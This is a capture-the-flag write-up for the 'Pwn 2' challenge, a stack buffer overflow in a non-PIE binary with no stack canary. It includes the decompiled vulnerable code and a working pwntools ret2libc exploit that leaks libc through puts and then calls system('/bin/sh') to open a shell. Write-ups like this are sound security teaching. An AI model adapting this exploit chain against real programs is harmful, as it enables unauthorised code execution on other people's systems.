# **Pwn 2**
Textbook buffer overflow *without* win function

# Executable
checksec :
```
[*] '/home/skuuk/n00bz/pwn2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
decompilation :
```C
void main(EVP_PKEY_CTX *param_1)

{
  char local_28 [32];
  
  init(param_1);
  puts("Would you like a flag?");
  fgets(input,0x19,stdin);
  puts("Wrong Answer! I\'ll give you another chance!\n");
  puts("Would you like a flag?");
  fgets(local_28,0x60,stdin);
  system("cat fake_flag.txt");
  return;
}
```
no canary, the only local on the stack is the buffer `local_28` itself so the returned address is at offset `32 + 8 = 40` 
(counting 8 bytes for the saved `rbp`)
# Exploit

The exploit is in 2 phases :
- first we leak the address of libc by returning to puts (via the plt) with the got entry of puts as argument (which contains the adress of puts in libc since puts has been called previously) then return to `main`
- second we return to system with the address of `/bin/sh\x00` as argument to spawn a shell

*Returning to main allows us use the buffer overflow a second time*
```python
io = start()

# gadgets in the executable
ret = 0x40101a
pop_rdi = 0x401196

# leak libc base + return to main
io.sendline("a")
io.sendline(b"a"*40+ p64(pop_rdi) + p64(exe.got['puts'])  +p64(exe.plt['puts']) + p64(exe.symbols['main']))
io.recvuntil("}")

libc = exe.libc
libc.address = int.from_bytes(io.recvline()[:-1],'little') - libc.symbols['puts']
print(f'{libc.address:x}')

# return to system
io.sendline("a")
io.sendline(b"a"*40 + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00')))  + p64(libc.symbols['system']))

io.sendline("cat flag.txt")
io.interactive()
```

# Flag
```
n00bz{3xpl01t_w1th0u7_w1n_5uc355ful!}
```